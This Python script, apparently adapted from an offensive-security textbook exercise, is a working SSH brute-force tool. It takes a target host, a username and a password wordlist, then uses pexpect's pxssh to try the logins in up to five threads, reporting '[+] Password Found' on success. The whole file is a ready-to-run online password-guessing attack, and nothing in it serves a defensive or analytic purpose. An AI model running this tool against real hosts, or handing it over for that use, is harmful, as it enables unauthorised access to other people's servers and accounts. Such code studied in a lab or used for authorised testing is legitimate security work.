'''
    Changes:
        - import pxssh into from pxexpect import pxssh

    Note:
        - The maintainers of pexpect suggest using Paramiko or 
          RedExpect instead of pxssh. RedExpect is fairly 
          interchangeable with pxssh API calls as is.
          
'''
from pexpect import pxssh
import argparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0


def connect(host, user, password, release):
    global Found
    global Fails

    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Password Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-H', dest='tgtHost', type=str,
        required=True, help='specify target host')
    parser.add_argument(
        '-F', dest='passwdFile', type=str,
        required=True, help='specify password file')
    parser.add_argument(
        '-u', dest='user', type=str,
        required=True, help='specify the user')
    options = parser.parse_args()

    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    fn = open(passwdFile, 'r')

    for line in fn.readlines():
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
        
        if Fails > 5:
            print("[!] Exiting: too Many Socket Timeouts")
            exit(0)
        
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print("[-] Testing: " + str(password))
        t = Thread(target=connect, args=(host, user, password, True))
        child = t.start()


if __name__ == '__main__':
    main()
